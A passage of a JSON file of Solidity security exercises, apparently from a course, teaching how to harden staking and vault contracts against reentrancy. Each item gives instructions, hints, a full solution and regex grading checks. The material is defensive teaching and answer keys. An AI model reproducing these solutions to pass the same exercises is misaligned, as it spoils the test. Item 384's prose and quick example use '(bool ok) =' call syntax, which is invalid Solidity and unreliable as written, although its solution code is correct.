class=\"io-val\">staked[msg.sender] = 0 &rarr; emit Withdrawn &rarr; call{value: amount} &rarr; if (!ok) revert</code></div>\n  <div class=\"io-row\"><span class=\"io-key\">setRewardRate from non-owner</span><code class=\"io-val\">revert NotOwner()</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract HardenedStaking {",
      "    mapping(address => uint256) public staked;",
      "    uint256 public rewardRate = 1;",
      "    address public owner;",
      "    bool private locked;",
      "",
      "    error NotOwner();",
      "    error NothingStaked();",
      "    error TransferFailed();",
      "",
      "    event Staked(address indexed user, uint256 amount);",
      "    event Withdrawn(address indexed user, uint256 amount);",
      "    event RewardRateChanged(uint256 newRate);",
      "",
      "    constructor() {",
      "        owner = msg.sender;",
      "    }",
      "",
      "    modifier onlyOwner() {",
      "        if (msg.sender != owner) revert NotOwner();",
      "        _;",
      "    }",
      "",
      "    modifier nonReentrant() {",
      "        require(!locked, \"reentrant\");",
      "        locked = true;",
      "        _;",
      "        locked = false;",
      "    }",
      "",
      "    function stake() external payable {",
      "        staked[msg.sender] += msg.value;",
      "        emit Staked(msg.sender, msg.value);",
      "    }",
      "",
      "    function setRewardRate(uint256 newRate) external onlyOwner {",
      "        rewardRate = newRate;",
      "        emit RewardRateChanged(newRate);",
      "    }",
      "",
      "    function withdraw() external nonReentrant {",
      "        uint256 amount = staked[msg.sender];",
      "        if (amount == 0) revert NothingStaked();",
      "        staked[msg.sender] = 0;",
      "        emit Withdrawn(msg.sender, amount);",
      "        (bool ok, ) = msg.sender.call{value: amount}(\"\");",
      "        if (!ok) revert TransferFailed();",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Rewrite VulnerableStaking as HardenedStaking: guard + CEI, onlyOwner, checked call, events, errors\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract HardenedStaking {\n    mapping(address => uint256) public staked;\n    uint256 public rewardRate = 1;\n    address public owner;\n    bool private locked;\n\n    error NotOwner();\n    error NothingStaked();\n    error TransferFailed();\n\n    event Staked(address indexed user, uint256 amount);\n    event Withdrawn(address indexed user, uint256 amount);\n    event RewardRateChanged(uint256 newRate);\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        if (msg.sender != owner) revert NotOwner();\n        _;\n    }\n\n    modifier nonReentrant() {\n        require(!locked, \"reentrant\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function stake() external payable {\n        staked[msg.sender] += msg.value;\n        emit Staked(msg.sender, msg.value);\n    }\n\n    function setRewardRate(uint256 newRate) external onlyOwner {\n        rewardRate = newRate;\n        emit RewardRateChanged(newRate);\n    }\n\n    function withdraw() external nonReentrant {\n        uint256 amount = staked[msg.sender];\n        if (amount == 0) revert NothingStaked();\n        staked[msg.sender] = 0;\n        emit Withdrawn(msg.sender, amount);\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        if (!ok) revert TransferFailed();\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+HardenedStaking\\s*\\{",
          "message": "Define contract HardenedStaking."
        },
        {
          "type": "codeContains",
          "value": "error NotOwner();",
          "message": "Declare error NotOwner();"
        },
        {
          "type": "codeContains",
          "value": "error TransferFailed();",
          "message": "Declare error TransferFailed();"
        },
        {
          "type": "matchesRegex",
          "pattern": "modifier\\s+onlyOwner\\s*\\(\\s*\\)\\s*\\{[\\s\\S]*revert\\s+NotOwner\\(\\)",
          "message": "onlyOwner must do: if (msg.sender != owner) revert NotOwner();"
        },
        {
          "type": "matchesRegex",
          "pattern": "modifier\\s+nonReentrant\\s*\\(\\s*\\)",
          "message": "Define modifier nonReentrant()."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*!locked",
          "message": "nonReentrant must require(!locked ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+setRewardRate\\s*\\([^)]*\\)\\s+external\\s+onlyOwner",
          "message": "setRewardRate(uint256 newRate) must be external onlyOwner."
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+withdraw\\s*\\(\\s*\\)\\s+external\\s+nonReentrant",
          "message": "withdraw() must be external nonReentrant."
        },
        {
          "type": "matchesRegex",
          "pattern": "staked\\[msg\\.sender\\]\\s*=\\s*0[\\s\\S]*msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount",
          "message": "Zero staked[msg.sender] BEFORE the external call (checks-effects-interactions)."
        },
        {
          "type": "matchesRegex",
          "pattern": "event\\s+Withdrawn\\s*\\([\\s\\S]*emit\\s+Withdrawn\\s*\\(",
          "message": "Declare event Withdrawn(...) and emit it in withdraw()."
        }
      ]
    },
    "explanation": "<p>A hardened contract is not just \"the bugs removed\", it is legible under review and observable in production, which is why events and custom errors are part of the deliverable, not decoration. In a real project the guard would be OpenZeppelin's <code>ReentrancyGuard</code> and the owner logic would be <code>Ownable2Step</code>; you now know exactly what those base contracts are doing for you.</p>"
  },
  {
    "id": 384,
    "title": "Spot the Bug: Add the Missing Line",
    "difficulty": "medium",
    "topic": "Security: Capstone",
    "level": 9,
    "xp": 15,
    "instructions": "<p>One last drill to consolidate the level. Below is <code>MiniVault</code>, a deposit-and-withdraw contract that is one line away from safe. The <code>withdraw</code> function reads the caller's balance, checks it is non-zero, sends the ether, and requires the send succeeded. It never sets the balance back to zero, and it sends before it would anyway, so an attacker's <code>receive()</code> can re-enter and drain it. This is the reentrancy from the start of the level, in miniature.</p>\n<p>Add the single missing statement, <code>balances[msg.sender] = 0;</code>, and put it in the right place: <em>before</em> the external call, so a nested <code>withdraw</code> reads a zero balance and fails its own check.</p>\n<ul>\n  <li><strong>checks-effects-interactions:</strong> validate, then update your own state, then call out. The missing line is the \"effects\" step.</li>\n  <li><strong>re-entry:</strong> the attacker's <code>receive()</code> calling <code>withdraw</code> again before the first call returns.</li>\n</ul>\n<p class=\"blueprint-line\"><code>require(amount &gt; 0 ...);</code> &rarr; <code>balances[msg.sender] = 0;</code> &rarr; <code>(bool ok) = msg.sender.call{value: amount}(\"\");</code> &rarr; <code>require(ok ...);</code></p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Quick Example</span>\n  <pre><code>function withdraw() external {\n    uint256 amount = balances[msg.sender];\n    require(amount > 0, \"nothing to withdraw\");\n    balances[msg.sender] = 0;                           // &lt;- the line to add, HERE\n    (bool ok) = msg.sender.call{value: amount}(\"\");\n    require(ok, \"send failed\");\n}</code></pre>\n</div>\n<div class=\"note-block\">\n  <span class=\"note-label\">Note</span>\n  <span>The editor just checks that the line is present and in order; it cannot run the attack. Confirm it in <code>remix.ethereum.org</code> with the reentrancy attacker you built earlier, without the line the vault empties, with it the re-entry gets a zero balance and reverts.</span>\n</div>\n<span class=\"task-label\">Your Task</span>\n<p class=\"task-line\">Write <code>contract MiniVault</code> with <code>mapping(address =&gt; uint256) public balances</code>, an <code>external payable</code> <code>deposit()</code> doing <code>balances[msg.sender] += msg.value;</code>, and an <code>external</code> <code>withdraw()</code> that: reads <code>uint256 amount = balances[msg.sender];</code>, does <code>require(amount &gt; 0 ...)</code>, then <code>balances[msg.sender] = 0;</code>, then <code>(bool ok) = msg.sender.call{value: amount}(\"\")</code>, then <code>require(ok ...)</code>. The zeroing line must appear before the <code>call</code>.</p>\n<div class=\"example-block\">\n  <span class=\"example-label\">Example</span>\n  <div class=\"io-row\"><span class=\"io-key\">withdraw() then re-enter withdraw()</span><code class=\"io-val\">second call: amount == 0, reverts</code></div>\n</div>",
    "hints": [
      "// SPDX-License-Identifier: MIT",
      "pragma solidity ^0.8.20;",
      "",
      "contract MiniVault {",
      "    mapping(address => uint256) public balances;",
      "",
      "    function deposit() external payable {",
      "        balances[msg.sender] += msg.value;",
      "    }",
      "",
      "    function withdraw() external {",
      "        uint256 amount = balances[msg.sender];",
      "        require(amount > 0, \"nothing to withdraw\");",
      "        balances[msg.sender] = 0;",
      "        (bool ok, ) = msg.sender.call{value: amount}(\"\");",
      "        require(ok, \"send failed\");",
      "    }",
      "}"
    ],
    "starterCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n// Complete MiniVault.withdraw: add the one line that zeroes the balance before the call\n",
    "solution": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract MiniVault {\n    mapping(address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        require(amount > 0, \"nothing to withdraw\");\n        balances[msg.sender] = 0;\n        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"send failed\");\n    }\n}",
    "validation": {
      "checks": [
        {
          "type": "matchesRegex",
          "pattern": "contract\\s+MiniVault\\s*\\{",
          "message": "Define contract MiniVault."
        },
        {
          "type": "matchesRegex",
          "pattern": "mapping\\s*\\(\\s*address\\s*=>\\s*uint256\\s*\\)\\s*public\\s+balances",
          "message": "Declare: mapping(address => uint256) public balances;"
        },
        {
          "type": "matchesRegex",
          "pattern": "function\\s+withdraw\\s*\\(\\s*\\)\\s+external",
          "message": "Add function withdraw() external."
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*amount\\s*>\\s*0",
          "message": "Keep require(amount > 0 ...)."
        },
        {
          "type": "matchesRegex",
          "pattern": "balances\\[msg\\.sender\\]\\s*=\\s*0",
          "message": "Add the missing line: balances[msg.sender] = 0;"
        },
        {
          "type": "matchesRegex",
          "pattern": "balances\\[msg\\.sender\\]\\s*=\\s*0[\\s\\S]*msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount",
          "message": "The zeroing line must come BEFORE the external call."
        },
        {
          "type": "matchesRegex",
          "pattern": "\\(\\s*bool\\s+ok\\s*,\\s*\\)\\s*=\\s*msg\\.sender\\.call\\{\\s*value\\s*:\\s*amount",
          "message": "Send with (bool ok) = msg.sender.call{value: amount}(\"\");"
        },
        {
          "type": "matchesRegex",
          "pattern": "require\\(\\s*ok",
          "message": "Check the send with require(ok ...)."
        }
      ]
    },
    "explanation": "<p>Most real reentrancy fixes are exactly this small, a state write moved above a call. That is also why the bug is still common: the vulnerable and safe versions differ by one line's position, and it is easy to miss in review unless you are specifically tracing where control leaves the contract. That tracing habit is the thing to carry out of this level.</p>"
  }
];
